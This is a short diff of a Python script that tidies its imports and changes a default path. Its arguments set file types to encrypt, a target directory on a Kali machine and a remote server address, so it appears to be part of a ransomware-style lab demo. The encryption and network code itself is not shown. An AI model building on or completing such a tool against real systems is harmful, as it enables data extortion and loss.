@@ -1,13 +1,9 @@
-import gc
-import os
-import json
-import uuid
-import ctypes
-import socket
-import subprocess
-from cryptography.fernet import Fernet
-import base64
 import argparse
+import gc
+import json
+import socket
+
+from cryptography.fernet import Fernet
 
 
 class Messenger:
@@ -59,7 +55,7 @@ if __name__ == "__main__":
     parser.add_argument('--command', type=str, default='enc')
     parser.add_argument('--file_extensions', nargs='*', default=['.txt', '.docx', '.jpg', '.png', '.pdf'],
                         help='List of file extensions to encrypt')
-    parser.add_argument('--directory', type=str, default='/home/kali/demo/', help='Target directory')
+    parser.add_argument('--directory', type=str, default='/home/kali/Desktop/demo/', help='Target directory')
     parser.add_argument('--server_host', type=str, default='192.168.181.129', help='Target server')
     parser.add_argument('--server_port', type=int, default=12345, help='Target server')
 
